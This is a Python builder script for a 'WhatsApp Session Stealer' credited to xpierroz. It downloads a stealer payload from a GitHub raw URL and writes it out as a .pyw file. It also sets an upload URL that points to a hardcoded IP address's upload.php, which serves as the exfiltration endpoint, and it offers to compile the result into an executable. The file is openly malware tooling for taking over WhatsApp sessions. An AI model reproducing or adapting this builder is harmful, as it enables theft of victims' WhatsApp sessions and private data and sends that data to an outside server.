from colorama import Fore
import time
import os
import ctypes
import requests

from pystyle import Colors, Colorate, Write, Center, Box
from utils import _exit, _compile

os.system('cls')
ctypes.windll.kernel32.SetConsoleTitleW("WhatsApp Session Stealer | by xpierroz")

banner = """ 
        ╦ ╦╔═╗       
        ║║║╠═╣       
        ╚╩╝╩ ╩       
╔═╗┌┬┐┌─┐┌─┐┬  ┌─┐┬─┐
╚═╗ │ ├┤ ├─┤│  ├┤ ├┬┘
╚═╝ ┴ └─┘┴ ┴┴─┘└─┘┴└─
"""

def main():
    os.system("cls")
    print("\n")  # Formatting stuff
    print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(banner), 1))
    print(Colorate.Horizontal(Colors.green_to_blue, Box.Lines("made by github.com/xpierroz")))
    print("\n")
    
    Write.Print(f"    .$ Fetching payload ...", Colors.green_to_yellow, interval=0.05)
    payload = requests.get("https://raw.githubusercontent.com/xpierroz/whatsappstealer/master/payload.py").text
    
    with open("whatsapp.pyw", "w") as f:
        f.write(payload.replace('UPLOAD_URL = "http://47.236.178.137/upload.php"', f'UPLOAD_URL = "http://47.236.178.137/upload.php"'))
        
    Write.Print(f"\n    .$ Payload fetched !", Colors.green_to_cyan, interval=0.05)
    compiling = Write.Input("\n    .$ Compile to exe [Y/N] -> ", Colors.green_to_blue, interval=0.025)
    if compiling == "Y":
        _compile()
    else:
        _exit()

if __name__ == "__main__":
    main()